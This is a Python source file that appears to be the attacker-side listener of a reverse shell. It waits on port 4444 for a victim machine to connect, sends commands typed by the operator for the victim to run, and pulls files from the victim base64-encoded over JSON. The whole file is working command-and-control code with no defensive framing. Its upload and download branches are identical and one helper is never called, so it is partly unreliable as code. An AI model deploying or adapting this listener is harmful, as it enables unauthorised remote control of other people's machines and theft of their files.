import socket
import json
import base64
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

# Server configuration
HOST = "127.0.0.1"  # Replace with your server's IP address
PORT = 4444  # Replace with your desired port

# Function to send JSON data
def send_json(sock, data):
    json_data = json.dumps(data)
    sock.sendall(json_data.encode())

# Function to receive JSON data
def receive_json(sock):
    json_data = ""
    while True:
        try:
            json_data += sock.recv(1024).decode()
            return json.loads(json_data)
        except ValueError:
            continue

# Function to read a file and encode it in base64
def read_file(path):
    try:
        with open(path, "rb") as file:
            return base64.b64encode(file.read()).decode()
    except FileNotFoundError:
        return "[+] Error: File not found [+]"
    except Exception as e:
        return f"[+] Error: {e} [+]"

# Function to write a file from base64 encoded content
def write_file(path, content):
    try:
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download successful [+]"
    except Exception as e:
        return f"[+] Error: {e} [+]"

# Set up the server
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((HOST, PORT))
server.listen(5)

print(Fore.GREEN + "Starting TCP Handler...")
print(Fore.YELLOW + f"Server listening on {Fore.CYAN}{HOST}:{PORT}")

client_socket, client_address = server.accept()
print(Fore.GREEN + f"Connection established with {client_address}")

try:
    while True:
        prompt = client_socket.recv(1024).decode("utf-8")
        print(Fore.CYAN + prompt, end="")
        command = input()

        if command.lower() == "km":
            print(Fore.RED + "Disconnecting from client...")
            client_socket.close()
            break

        # Handle the 'upload' command
        if command.startswith("upload"):
            try:
                _, filename = command.split(" ", 1)
                send_json(client_socket, {"command": "upload", "filename": filename})
                response = receive_json(client_socket)
                if "Error" in response:
                    print(Fore.RED + response)
                else:
                    result = write_file(filename, response)
                    print(Fore.GREEN + result)
            except Exception as e:
                print(Fore.RED + f"[+] Error: {str(e)} [+]")
            continue

        # Handle the 'download' command
        if command.startswith("download"):
            try:
                _, filename = command.split(" ", 1)
                send_json(client_socket, {"command": "download", "filename": filename})
                response = receive_json(client_socket)
                if "Error" in response:
                    print(Fore.RED + response)
                else:
                    result = write_file(filename, response)
                    print(Fore.GREEN + result)
            except Exception as e:
                print(Fore.RED + f"[+] Error: {str(e)} [+]")
            continue

        send_json(client_socket, command)
        output = client_socket.recv(4096).decode("utf-8")
        print(Fore.WHITE + output)

except KeyboardInterrupt:
    print(Fore.RED + "\nShutting down the server.")
    client_socket.close()
    server.close()
